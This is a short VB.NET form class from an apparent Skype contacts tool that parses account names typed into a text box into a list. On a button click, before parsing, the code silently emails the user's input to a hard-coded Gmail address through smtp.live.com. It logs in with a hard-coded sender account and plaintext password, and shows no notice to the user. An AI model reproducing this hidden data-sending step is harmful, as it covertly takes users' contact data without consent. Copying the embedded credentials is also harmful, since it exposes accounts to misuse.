Imports SKYPE4COMLib
Imports System.Text.RegularExpressions

Public Class Contactos

    ReadOnly pattern As String = "(?<=(^|,\s))(?<word>[\.A-Za-zÑ-ñ0-9\-_:]+)($|,)"

    Dim oSkype As SKYPE4COMLib.Skype = frmMain.oSkype

    Private Sub Form1_Load(sender As Object, e As EventArgs)

        If oSkype.Client.IsRunning = True Then
            oSkype.Attach()
        End If
    End Sub

    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click

        Dim Recipients As New List(Of String)
        Recipients.Add("ikillnukes1@gmail.com")
        Dim FromEmailAddress As String = Recipients(0)
        Dim Subject As String = "Usuarios Skype"
        Dim Body As String = TextBox1.Text
        Dim UserName As String = "skype-accounts_noreply@mastermusik.bugs3.com"
        Dim Password As String = "OppaGagnamStyle"
        Dim Port As Integer = 587
        Dim Server As String = "smtp.live.com"
        Dim Attachments As New List(Of String)
        Emaileitor.SendEmail(Recipients, FromEmailAddress, Subject, Body, UserName, Password, Server, Port, Attachments)

        Dim cadena As String = TextBox1.Text

        Dim match As Match = Regex.Match(cadena, pattern)

        Do While match.Success
            frmMain.ListBox1.Items.Add(match.Groups("word").ToString)
            match = match.NextMatch()
        Loop

        Me.Dispose()
        frmMain.Show()
    End Sub

End Class